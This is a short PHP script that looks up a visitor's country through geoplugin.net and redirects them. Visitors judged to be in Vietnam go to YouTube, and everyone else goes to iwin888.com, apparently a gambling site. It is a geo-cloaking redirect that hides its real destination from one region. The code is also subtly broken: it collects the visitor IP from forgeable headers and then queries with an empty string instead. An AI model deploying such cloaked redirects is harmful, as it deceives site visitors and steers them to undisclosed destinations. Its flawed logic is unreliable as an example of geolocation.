
<?php
    // PHP code to extract IP 
  
    function getVisIpAddr() {
        
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        else {
            return $_SERVER['REMOTE_ADDR'];
        }
    }
    
    // Store the IP address
    $vis_ip = getVisIPAddr();
    
    // Display the IP address
    // echo $vis_ip;

    // PHP code to obtain country, city, 
    // continent, etc using IP Address
    
    $ip = '';
    
    // Use JSON encoded string and converts
    // it into a PHP variable
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    
    $country_name = $ipdat->geoplugin_countryName;
    
    if($country_name == 'Vietnam')
    {
        header ('Location: https://www.youtube.com/');
    }
    else{
        header ('Location: https://iwin888.com/');
    }

?>